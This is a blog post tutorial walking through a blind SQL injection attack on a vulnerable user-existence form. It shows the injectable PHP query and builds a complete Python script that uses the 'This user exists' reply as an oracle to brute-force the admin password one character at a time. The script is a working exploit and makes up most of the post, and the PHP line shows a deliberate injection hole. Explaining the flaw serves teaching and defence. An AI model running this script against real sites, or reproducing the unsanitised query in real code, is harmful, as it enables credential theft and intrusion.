---
layout: post
title:  "SQL Oracle"
date:   2016-03-08 21:30
categories: security
tags: security code
---
Lets assume we stumble upon a web application that lets you query if a user
exists.

The underlying database, if it was badly designed, like a lot of web
applications are, could look like this:
{% highlight sql %}
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
{% endhighlight %}
The first and major fault is, that the password is not encrypted, which would
increase the computing complexity a lot. But our application is what it is.

The webapplication has a form field in which one can input a user name and a
button to submit the query. It checks for a user in the database like this:
{% highlight php %}
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
{% endhighlight %}

Next major fault: no input sanitation. What we see here opens up a hole so big
that we need to use SQL injection. The application forces this on us, basically.

But our brave application developer keeps on going. So if a user was found it
returns a HTML site containing a string like  "This user exists.". We use this
as a oracle for guessing a password.

So lets start to automate this. We already guessed a user name in our case
'admin'.
{% highlight python %}
username = 'admin" and password like binary "'
submit = "Check existence"
{% endhighlight %}

We use the `binary` SQL operator to distinguish between upper and lower case
in SQL queries.

We prepare also our possible character set:

{% highlight python %}
string=''.join(ch for ch in string.printable)
{% endhighlight %}
Since this should be a human readable password, we only need printable
characters.

Now lets put together a function to try our passwords:
{% highlight python %}
def try_password(password):
    sql_injection = username+password
    data = {
        "username":sql_injection,
        "submit":submit
        }
    encoded_data=urllib.urlencode(data)
    request = urllib2.Request("https://example.com/testuser")
    return urllib2.urlopen(request,encoded_data)
{% endhighlight %}
We pass our password candidate to this function. We create a `data` map which will hold the form data. We then encode it and send it over the wire. What ever comes back will hold the information we need.

Lets finalize this by writing the bruteforce function and checking for
completion:
{% highlight python %}
while True:
    for ch in string:
        testname = bruteforce+(ch+"%")
        content = try_password(testname)
        if "This user exists" in content.readlines()[13]:
            bruteforce += ch
            print bruteforce
            if "This user exists." in try_password(bruteforce).readlines()[13]:
                print 'Password is: %s' % bruteforce
                sys.exit(0)
            break
{% endhighlight %}
We iterate over all the characters in our string, and append this and a "%", the
SQL wildcard character, to our already confirmed password. As soon as we find a
matching character we append it to our already known part of the string, and
print it so we see some progress. We then try again to see if we are already
done. For this we simple omit the wildcard character.

The complete script looks like this:
{% highlight python %}
import urllib,urllib2,base64
import string, sys

username = 'admin" and password like binary "'
submit = "Check existence"

bruteforce = ''
string=''.join(ch for ch in string.printable if ch.isalnum())

def try_password(password):
    sql_injection = username+password
    data = {
        "username":sql_injection,
        "submit":submit
        }
    encoded_data=urllib.urlencode(data)
    request = urllib2.Request("https://example.com/testuser")
    return urllib2.urlopen(request,encoded_data)

while True:
    for ch in string:
        testname = bruteforce+(ch+"%")
        content = try_password(testname)
        if "This user exists" in content.readlines()[13]:
            bruteforce += ch
            print bruteforce
            if "This user exists." in try_password(bruteforce).readlines()[13]:
                print 'Password is: %s' % bruteforce
                sys.exit(0)

            break
{% endhighlight %}
